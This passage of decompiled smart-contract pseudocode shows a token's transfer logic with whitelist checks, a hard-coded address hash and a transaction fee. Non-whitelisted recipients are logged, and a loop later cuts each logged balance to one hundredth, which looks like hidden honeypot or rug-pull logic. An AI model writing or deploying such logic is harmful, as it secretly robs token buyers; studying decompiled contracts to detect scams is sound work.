                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if ext_call.return_data[12 len 20] != msg.sender:
                        if msg.sender == address(ext_call.return_data[0]):
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    else:
                        if stor16[address(arg1)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    if stor18:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if not arg2:
                        require arg2 <= _maxTxAmount
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 216] = this.address
                        mem[(15 * ceil32(return_data.size)) + 248] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 280 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            return 1, mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)]
                        stor19.length++
                        stor19[stor19.length].field_0 = arg1
                        stor19[stor19.length].field_256 = arg2
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2,
                                      mem[(17 * ceil32(return_data.size)) + 308 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                    else:
                        if arg2 and _fee > -1 / arg2:
                            revert with 'NH{q', 17
                        if not arg2:
                            revert with 'NH{q', 18
                        if arg2 * _fee / arg2 != _fee:
                            revert with 0, 'SafeMath: multiplication overflow'
                        require arg2 <= _maxTxAmount
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 216] = this.address
                        mem[(15 * ceil32(return_data.size)) + 248] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 280 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < arg2 * _fee / 100:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100 > 0:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
                                              mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                            return 1, mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)]
                        stor19.length++
                        stor19[stor19.length].field_0 = arg1
                        stor19[stor19.length].field_256 = arg2
                        if arg2 < arg2 * _fee / 100:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[0] += arg2 * _fee / 100
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2 - (arg2 * _fee / 100),
                                      mem[(17 * ceil32(return_data.size)) + 308 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                        if arg2 * _fee / 100 > 0:
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 * _fee / 100,
                                          mem[(17 * ceil32(return_data.size)) + 308 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          0,
                    return 1, mem[(17 * ceil32(return_data.size)) + 308 len 9 * ceil32(return_data.size)]
                idx = 0
                while idx < stor19.length:
                    mem[0] = stor19[idx].field_0
                    mem[32] = 13
                    _753 = mem[64]
                    mem[64] = mem[64] + 64
                    mem[_753] = 26
                    mem[_753 + 32] = 'SafeMath: division by zero'
                    if idx >= stor19.length:
                        revert with 'NH{q', 50
                    mem[0] = stor19[idx].field_0
                    mem[32] = 13
                    balanceOf[stor19[idx].field_0] = balanceOf[stor19[idx].field_0] / 100
                    if idx == -1:
                        revert with 'NH{q', 17
                    idx = idx + 1
                    continue 
                stor19.length = 0
                mem[0] = 19
                idx = 0
                while 2 * stor19.length > idx:
                    stor19[idx].field_0 = 0
                    stor19[idx].field_256 = 0
                    idx = idx + 2
                    continue 
                require ext_code.size(address(stor20.field_8))
                staticcall address(stor20.field_8).factory() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7058 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _7064 = mem[_7058]
                require mem[_7058] == mem[_7058 + 12 len 20]
                require ext_code.size(address(stor20.field_8))
                staticcall address(stor20.field_8).WETH() with:
                        gas gas_remaining wei
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7082 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                _7088 = mem[_7082]
                require mem[_7082] == mem[_7082 + 12 len 20]
                mem[mem[64] + 4] = this.address
                mem[mem[64] + 36] = address(_7088)
                require ext_code.size(address(_7064))
                staticcall address(_7064).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(_7088)
                mem[mem[64]] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                _7106 = mem[64]
                mem[64] = mem[64] + ceil32(return_data.size)
                require return_data.size >= 32
                require mem[_7106] == mem[_7106 + 12 len 20]
                if arg1 != mem[_7106 + 12 len 20]:
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7160 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7178 = mem[_7160]
                    require mem[_7160] == mem[_7160 + 12 len 20]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7226 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7256 = mem[_7226]
                    require mem[_7226] == mem[_7226 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_7256)
                    require ext_code.size(address(_7178))
                    staticcall address(_7178).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(_7256)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7406 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7472 = mem[_7406]
                    require mem[_7406] == mem[_7406 + 12 len 20]
                    if mem[_7406 + 12 len 20] != msg.sender:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7838 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7838 + 32 len mem[_7838]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if msg.sender == address(_7472):
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7862 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7862 + 32 len mem[_7862]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor16[address(arg1)]:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                else:
                    mem[0] = msg.sender
                    mem[32] = 16
                    if stor16[address(msg.sender)]:
                        if stor16[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                        else:
                            mem[0] = arg1
                            mem[32] = 16
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[mem[64] + 32] = address(arg1)
                                _7238 = mem[64]
                                mem[mem[64]] = 20
                                mem[64] = mem[64] + 52
                                if sha3(mem[_7238 + 32 len mem[_7238]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    if arg1 == this.address:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if stor16[address(msg.sender)]:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor18:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(stor20.field_8))
                                                    staticcall address(stor20.field_8).WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor19.length++
                                                        stor19[stor19.length].field_0 = arg1
                                                        stor19[stor19.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
